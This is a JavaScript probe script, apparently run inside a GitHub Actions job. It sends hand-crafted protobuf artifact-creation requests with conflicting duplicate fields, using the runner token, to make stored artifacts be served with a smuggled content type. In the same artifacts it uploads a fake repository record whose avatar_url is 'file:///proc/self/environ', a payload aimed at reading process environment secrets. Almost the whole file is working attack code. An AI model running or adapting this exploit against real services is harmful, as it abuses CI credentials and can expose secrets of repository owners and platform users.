import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const safe = 'application/json';

function varint(value) {
  let n = BigInt.asUintN(64, BigInt(value));
  const out = [];
  do {
    let b = Number(n & 127n);
    n >>= 7n;
    if (n) b |= 128;
    out.push(b);
  } while (n);
  return Buffer.from(out);
}

function bytesField(number, value) {
  const b = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(number * 8 + 2), varint(b.length), b]);
}

function intField(number, value) {
  return Buffer.concat([varint(number * 8), varint(value)]);
}

function stringWrapper(values) {
  return Buffer.concat(values.map(value => bytesField(1, value)));
}

function requestBody(name, versions, wrappers) {
  return Buffer.concat([
    bytesField(1, ids.workflowRunBackendId),
    bytesField(2, ids.workflowJobRunBackendId),
    bytesField(3, name),
    ...versions.map(version => intField(5, version)),
    ...wrappers.map(values => bytesField(6, stringWrapper(values))),
  ]);
}

function decodeCreateResponse(buffer) {
  let pos = 0;
  const result = {ok: false, url: ''};
  function readVarint() {
    let out = 0n;
    let shift = 0n;
    while (pos < buffer.length) {
      const b = buffer[pos++];
      out |= BigInt(b & 127) << shift;
      if (!(b & 128)) return out;
      shift += 7n;
    }
    throw new Error('truncated varint');
  }
  while (pos < buffer.length) {
    const tag = Number(readVarint());
    const field = tag >> 3;
    const wire = tag & 7;
    if (wire === 0) {
      const value = readVarint();
      if (field === 1) result.ok = value !== 0n;
    } else if (wire === 2) {
      const length = Number(readVarint());
      const value = buffer.subarray(pos, pos + length);
      pos += length;
      if (field === 2) result.url = value.toString();
    } else {
      throw new Error(`unsupported response wire type ${wire}`);
    }
  }
  return result;
}

async function createBinary(name, versions, wrappers) {
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      'content-type': 'application/protobuf',
      accept: 'application/protobuf',
    },
    body: requestBody(name, versions, wrappers),
  });
  const raw = Buffer.from(await response.arrayBuffer());
  let decoded = {};
  if (response.ok) {
    try { decoded = decodeCreateResponse(raw); } catch (error) { decoded.error = String(error); }
  }
  return {
    status: response.status,
    responseType: response.headers.get('content-type'),
    responseHex: response.ok ? undefined : raw.subarray(0, 180).toString('hex'),
    ...decoded,
  };
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
}

async function run(label, versions, wrappers) {
  const name = `${process.env.GITHUB_RUN_ID}-proto-${label}`;
  const row = {label, versions, wrappers, name};
  try {
    const created = await createBinary(name, versions, wrappers);
    row.created = {...created, url: created.url ? '<signed>' : ''};
    if (!created.url) return row;
    const placeholder = Buffer.from('{"probe":"placeholder"}');
    await upload(created.url, placeholder);
    const digest = createHash('sha256').update(placeholder).digest('hex');
    const finalized = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(placeholder.length),
      hash: StringValue.create({value: `sha256:${digest}`}),
    });
    row.artifactId = String(finalized.artifactId);
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${row.artifactId}/zip`;
    const payload = Buffer.from(JSON.stringify({
      full_name: repository,
      owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
      description: 'Repo Cassette protobuf carrier',
      stargazers_count: 0,
    }));
    await upload(created.url, payload);
    const signed = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(signed.signedUrl);
    row.rsct = url.searchParams.get('rsct');
    const response = await fetch(url);
    row.contentTypeHex = Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex');
    const responseBody = Buffer.from(await response.arrayBuffer());
    row.bodyMatch = responseBody.equals(payload);
    row.repository = repository;
  } catch (error) {
    row.error = String(error).slice(0, 400);
  }
  return row;
}

const cases = [
  ['decoded-v6', [7, 6], [[safe], [odd]]],
  ['decoded-v7', [6, 7], [[odd], [safe]]],
  ['v-first7-last6-one-mime', [7, 6], [[odd]]],
  ['v-first6-last7-one-mime', [6, 7], [[safe]]],
  ['triple-last6', [6, 7, 6], [[safe], [odd]]],
  ['triple-last7', [7, 6, 7], [[odd], [safe]]],
  ['nested-last-odd', [6], [[safe, odd]]],
  ['nested-last-safe', [7], [[odd, safe]]],
  ['outer-last-odd', [6], [[safe], [odd]]],
  ['outer-last-safe', [7], [[odd], [safe]]],
];

const rows = await Promise.all(cases.map(item => run(...item)));
for (const row of rows) console.log(`PROTO_RESULT ${JSON.stringify(row)}`);
